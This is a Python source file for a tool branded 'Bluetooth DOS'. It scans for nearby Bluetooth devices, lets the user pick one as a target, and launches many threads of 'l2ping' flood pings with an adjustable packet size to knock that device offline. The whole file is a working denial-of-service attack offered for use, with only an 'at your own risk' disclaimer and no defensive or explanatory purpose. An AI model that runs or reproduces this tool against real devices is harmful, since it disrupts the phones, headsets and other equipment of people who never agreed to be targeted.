import os
import threading
import time
import subprocess
from pyfiglet import Figlet
from colorama import Fore
from rainbowtext import text

def dos_attack(target_addr, package_size):
    os.system(f'l2ping -i hci0 -s {package_size} -f {target_addr}')

def display_logo():
    banner = Figlet(font="doom").renderText("Bluetooth DOS")
    print(text(banner))
    print(Fore.RED + "[*] Powered by Root of Cyber")
    print(text( "[+] Created by Mr.Cyb3rGhost"))
    print(Fore.LIGHTMAGENTA_EX + "[-] Bluetooth Denial of Service")
    print(Fore.YELLOW + "╼" * 60)

def terminal_clear():
    
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def main():
    display_logo()
    time.sleep(1)
    print('YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF THE END-USER.')
    
    if input(Fore.GREEN + "Do you agree? (y/n) > ").lower() != 'y':
        print(Fore.RED + "Exiting...")
        return

    terminal_clear()
    display_logo()
    print(Fore.GREEN + "\nScanning ...")
    try:
        output = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)
    except subprocess.CalledProcessError:
        print(Fore.RED + "[!] ERROR: Failed to scan for Bluetooth devices.")
        return
    
    devices = output.splitlines()[1:]  # Remove the header line
    if not devices:
        print(Fore.RED + "[!] No devices found.")
        return

    device_list = []
    print(Fore.GREEN + "| ID  |   MAC Address     |   Device Name |")
    for idx, line in enumerate(devices):
        mac, *name = line.split()
        device_list.append(mac)
        print(f"| {idx}   |   {mac}  |   {' '.join(name)} |")

    target = input(Fore.GREEN + 'Target ID or MAC Address > ')
    target_addr = device_list[int(target)] if target.isdigit() else target

    if not target_addr:
        print(Fore.RED + '[!] ERROR: Target address is missing.')
        return

    try:
        package_size = int(input(Fore.GREEN + 'Package size > '))
        thread_count = int(input(Fore.GREEN + 'Thread count > '))
    except ValueError:
        print(Fore.RED + '[!] ERROR: Package size and thread count must be integers.')
        return

    terminal_clear()
    print("\033[31m[*] Starting DOS attack in 3 seconds...\033[0m")
    time.sleep(3)
    

    print(Fore.GREEN + f'[*] Building threads...')
    for i in range(thread_count):
        print(Fore.GREEN + f'[*] Starting thread #{i + 1}')
        threading.Thread(target=dos_attack, args=(target_addr, package_size)).start()

    print(Fore.GREEN + f'[*] All threads started... DOS attack in progress.')

if __name__ == '__main__':
    try:
        terminal_clear()
        main()
    except KeyboardInterrupt:
        print(Fore.RED + '\n[*] Aborted by user.')
    except Exception as e:
        print(Fore.RED + f'[!] ERROR: {e}')
